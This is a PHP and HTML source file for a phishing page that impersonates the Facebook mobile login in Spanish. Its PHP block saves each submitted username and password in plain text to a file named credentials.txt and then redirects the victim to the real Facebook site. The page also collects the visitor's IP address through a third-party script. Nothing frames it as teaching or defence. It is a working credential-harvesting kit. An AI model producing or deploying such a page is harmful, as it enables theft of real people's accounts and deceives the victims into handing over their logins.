<?php

if(isset($_POST["usuario"])){
	$user = $_POST["usuario"];
	$contra = $_POST["contrasena"];
	$file = fopen("credentials.txt", "w+");
	fwrite($file, "Usuario: $user
Contrasena: $contra
");
	header('location: http://m.facebook.com/');
}

?>

<!DOCTYPE html>
<html lang="es">
 <head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="theme-color" content="#000">
  <link rel="stylesheet" href="style.css">
  <script src="jquery.min.js"></script>
  <title>Facebook</title>
 </head>
 <body>
  <div class="capa-principal">
   <img src="facebook.jpg" class="facebook-logo" alt="Tu navedor no es compatible con la pagina">
   <p class="parrafo1">English ° Português ° <a href="#" class="mas">Más...</a></p>
   <form method="POST">
    <input class="input1" name="usuario" type="text" placeholder="Teléfono o correo electrónico" required>
    <input class="input2" name="contrasena" type="password" placeholder="Contrasena" required>
   <input type="submit" class="iniciar-secion" value="Iniciar seción">
</form> <a href="index.html#" class="enlace3">¿Olvidaste tu contraseña ?</a>
   <hr> <a href="index.html#" class="enlace4"><p class="parrafo2">Crear cuenta de Facebook</p></a>
  </div>
<strong id="myIp"></strong>
<script>
function get_ip(obj){
	document.getElementById('myIp').innerHTML = obj.ip;
};
</script>

<script type="text/javascript" src="https://api.ipify.org/?format=jsonp&callback=get_ip"></script>
<script src="ip.js"></script>
<script src='ajax.js'></script>
 </body>
</html>
